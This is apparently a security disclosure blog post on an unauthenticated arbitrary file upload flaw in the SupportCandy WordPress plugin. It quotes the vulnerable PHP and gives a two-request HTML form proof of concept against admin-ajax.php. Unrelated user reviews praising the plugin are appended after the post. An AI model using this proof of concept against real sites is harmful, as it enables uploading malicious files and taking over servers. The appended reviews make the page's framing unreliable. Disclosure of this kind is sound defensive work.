# Arbitrary File Upload Vulnerability in SupportCandy

When it comes to security of WordPress plugins, what other security companies generally do is to add protection against vulnerabilities after they have already been widely exploited, which it should be pretty obvious doesn’t produce good results. By comparison, we do [proactive monitoring of changes made to plugins in the Plugin Directory to try to catch serious vulnerabilities](https://www.pluginvulnerabilities.com/proactive-monitoring-for-vulnerabilities-in-new-versions-of-wordpress-plugins/), but we only have so much time to do that with the amount of customers we have, so we have a backlog of possible vulnerabilities that didn’t look like serious issues that we haven’t had time to get to. Sometimes, as is the case, with the plugin [SupportCandy](https://wordpress.org/plugins/supportcandy/) when the plugin comes up again with that proactive monitoring we realize that vulnerability was more serious, as the plugin contains an arbitrary file upload vulnerability, which is the kind that hackers are likely to exploit.

What is odd about the arbitrary file upload vulnerability is that the developer has had file upload capability that was at least partially secured for some time and then added new functionality that is totally insecure back in January.

The older functionality is in the file /includes/admin/tickets/upload\_file.php and restricts what types of files can be uploaded:

| ``` $tempExtension = explode('.', $_FILES['file']['name']); $extension     = $tempExtension[count($tempExtension)-1]; switch ($extension){ 	case 'exe': 	case 'php': 	case 'js': 		$isError      = true; 		$errorMessege = __('Error: file format not supported!','supportcandy'); 		break; } if ( preg_match('/php/i', $extension) || preg_match('/phtml/i', $extension) ){   $isError=true;   $errorMessege=__('Error: file format not supported!','supportcandy'); } ``` |
| --- |

$tempExtension = explode('.', $\_FILES['file']['name']);
$extension = $tempExtension[count($tempExtension)-1];
switch ($extension){
case 'exe':
case 'php':
case 'js':
$isError = true;
$errorMessege = \_\_('Error: file format not supported!','supportcandy');
break;
}
if ( preg\_match('/php/i', $extension) || preg\_match('/phtml/i', $extension) ){
$isError=true;
$errorMessege=\_\_('Error: file format not supported!','supportcandy');
}

By comparison here is the entirety of the code in the file /includes/admin/tickets/upload\_file\_rb.php:

| ``` 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ``` | ``` if ( ! defined( 'ABSPATH' ) ) exit;   $upload_dir     = wp_upload_dir(); $save_file_name = $_FILES['file']['name']; $save_file_name = str_replace(' ','_',$save_file_name); $save_file_name = str_replace(',','_',$save_file_name);   $save_file_name = time().'_'. $save_file_name;   $save_directory = $upload_dir['basedir'] . '/wpsc/'.$save_file_name; $file_url       = $upload_dir['baseurl'] . '/wpsc/'.$save_file_name; move_uploaded_file( $_FILES['file']['tmp_name'], $save_directory );   echo json_encode($file_url); ``` |
| --- | --- |

if ( ! defined( 'ABSPATH' ) ) exit;
$upload\_dir = wp\_upload\_dir();
$save\_file\_name = $\_FILES['file']['name'];
$save\_file\_name = str\_replace(' ','\_',$save\_file\_name);
$save\_file\_name = str\_replace(',','\_',$save\_file\_name);
$save\_file\_name = time().'\_'. $save\_file\_name;
$save\_directory = $upload\_dir['basedir'] . '/wpsc/'.$save\_file\_name;
$file\_url = $upload\_dir['baseurl'] . '/wpsc/'.$save\_file\_name;
move\_uploaded\_file( $\_FILES['file']['tmp\_name'], $save\_directory );
echo json\_encode($file\_url);

That doesn’t restrict what type of file can be uploaded. It does give the file a unique name by prepending the time it is being uploaded, but that is displayed once the file is uploaded.

The first line of code in that file restricts direct access and even if it didn’t the next line of code would causes a fatal error if the file is accessed directly.

The intended path to access that starts with WordPress’ AJAX functionality as the function tickets() is registered to be accessed through that by both those logged in as well those not logged in:

| ``` 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ``` | ``` 			$ajax_events = array( 				'frontend'               => true, 				'settings'               => false, 				'custom_fields'          => false, 				'ticket_list'            => false, 				'email_notifications'    => false, 				'support_agents'         => false, 				'tickets'                => true, 				'appearance_settings'    => false, 				'run_db_v2_upgrade' => false, 			);   foreach ($ajax_events as $ajax_event => $nopriv) { 					add_action('wp_ajax_wpsc_' . $ajax_event, array($this, $ajax_event)); 	if ($nopriv) { 		add_action('wp_ajax_nopriv_wpsc_' . $ajax_event, array($this, $ajax_event)); 	} } ``` |
| --- | --- |

$ajax\_events = array(
'frontend' => true,
'settings' => false,
'custom\_fields' => false,
'ticket\_list' => false,
'email\_notifications' => false,
'support\_agents' => false,
'tickets' => true,
'appearance\_settings' => false,
'run\_db\_v2\_upgrade' => false,
);
foreach ($ajax\_events as $ajax\_event => $nopriv) {
add\_action('wp\_ajax\_wpsc\_' . $ajax\_event, array($this, $ajax\_event));
if ($nopriv) {
add\_action('wp\_ajax\_nopriv\_wpsc\_' . $ajax\_event, array($this, $ajax\_event));
}
}

That function will cause the code in the file /includes/admin/tickets/tickets\_ajax.php to run:

| ``` 42 43  ``` | ``` public function tickets(){ 	include WPSC_ABSPATH . 'includes/admin/tickets/tickets_ajax.php'; ``` |
| --- | --- |

public function tickets(){
include WPSC\_ABSPATH . 'includes/admin/tickets/tickets\_ajax.php';

In that file the value of the GET or POST input “setting\_action” will be used in a switch statement:

| ``` 6 7 8  ``` | ``` $setting_action =  isset($_REQUEST['setting_action']) ? sanitize_text_field($_REQUEST['setting_action']) : '';   switch ($setting_action) { ``` |
| --- | --- |

$setting\_action = isset($\_REQUEST['setting\_action']) ? sanitize\_text\_field($\_REQUEST['setting\_action']) : '';
switch ($setting\_action) {

Setting that to “rb\_upload\_file” will cause the code in vulnerable file upload file to run:

| ``` 187  ``` | ``` case 'rb_upload_file': include WPSC_ABSPATH . 'includes/admin/tickets/upload_file_rb.php'; ``` |
| --- | --- |

case 'rb\_upload\_file': include WPSC\_ABSPATH . 'includes/admin/tickets/upload\_file\_rb.php';

There is a limitation with that though, which is that directory the file will be upload to doesn’t exist by default, but that can be created by uploading a file through the securer file upload functionality first, which is accessible through that same switch mechanism:

| ``` 31  ``` | ``` case 'upload_file': include WPSC_ABSPATH . 'includes/admin/tickets/upload_file.php'; ``` |
| --- | --- |

case 'upload\_file': include WPSC\_ABSPATH . 'includes/admin/tickets/upload\_file.php';

Due to the moderators of the WordPress Support Forum’s [continued](https://www.pluginvulnerabilities.com/2018/09/27/wordpress-team-didnt-notify-developer-of-plugin-with-700000-active-installations-about-vulnerability-they-knew-about/) [inappropriate](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-engaged-in-cover-up-of-security-issues-in-wordpress-plugins/)[behavior](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-stop-people-from-getting-help-so-they-can-promote-favored-security-companies/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then only trying to notify the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that since multiple [previously full disclosed vulnerabilities](https://www.pluginvulnerabilities.com/2018/11/30/hackers-have-been-probing-for-usage-of-the-kiwi-social-share-wordpress-plugin-for-a-couple-of-weeks/)were [quickly on hackers’ radar](https://www.pluginvulnerabilities.com/2019/03/26/webarx-hides-that-their-firewall-failed-to-provide-same-protection-simply-updating-wordpress-plugin-would-have/), but it appears those moderators have such disdain for the rest of the WordPress community that their continued ability to act inappropriate is more important that what is best for the rest of the community.

## Proof of Concept

The following proof of concept will upload a file to the location returned with the second request.

Make sure to replace “[path to WordPress]” with the location of WordPress.

This request will create the upload directory when uploading a file not restricted from being uploaded, as shown in the code above:

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=upload_file" method="POST" enctype="multipart/form-data">
<input type="file" name="file" />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```

This request allows uploading arbitrary files:

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=rb_upload_file" method="POST" enctype="multipart/form-data">
<input type="file" name="file" />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```
## Is It Fixed?

If you are reading this post down the road the best way to find out if this vulnerability or other WordPress plugin vulnerabilities in plugins you use have been fixed is to sign up for [our service](https://www.pluginvulnerabilities.com/product/subscription/), since what we uniquely do when it comes to that type of data is to test to see if vulnerabilities have really been fixed. Relying on the developer’s information, can lead you astray, as we often find that they believe they have fixed vulnerabilities, but have failed to do that.

We use SupportCandy as a system to process maintenance requests at a school. It’s a great way to manage and process the multitude of requests coming in from various departments.

We have 4 businesses that we own and run and were using zendesk with 4 separate accounts, as we simply could not afford their multi-brand system for the users we have.
We decided to look at a much more cost effect system and having several WordPress websites we thought maybe we could spin another one up for our help centre.
After looking around at several other plugins, we decided to go with support candy, as it offered everything we needed.Being able to customize the look and feel to our brand’s is perfect, and their support is very fast at responding.So we are now saving a lot of money per month and getting what I feel is a better platform than Zendesk is a bonus.
Thank you support candy for making a spot on system.

I was truly impressed by how much you can accomplish with the free version and how effortless it is to set up! For my needs, I decided to upgrade to the pro version with all the extensions, and it unlocked even more incredible functionality.
What really stands out, though, is their support. I don’t think I’ve ever experienced better service than this. You open a ticket, and within an hour (!) you get a reply—and they always seem to have a solution for the minor issues I encountered!
If you’re looking for a reliable ticketing system for your website, don’t hesitate—this is the one to go for!

The best Support Ticket plugin I’ve tried. The Free version comes with almost everything you need, and it is well structured from inside out. What stand out is the excellent support. Every little issue was answered very quickly so far. There is also a comprehensive KB documentation available in the developer’s site. While the Free plugin is feature-rich, some essential functionalities are available only through paid add-ons and you have to buy them all as one bundle even though you really need only one. It would be nice if the paid add-ons could be purchased separately to keep the cost low. And there is some room for improvement as well. i.e. There is no bulk import function for the drop-down selection field. If you were to enter US/Canadian provinces/states then you must enter them all one by one. Form styling is limited, and it provides only Gravity form integration. Hope these functions will be added in the future. Finally, big ‘Thank You’ to Milind!
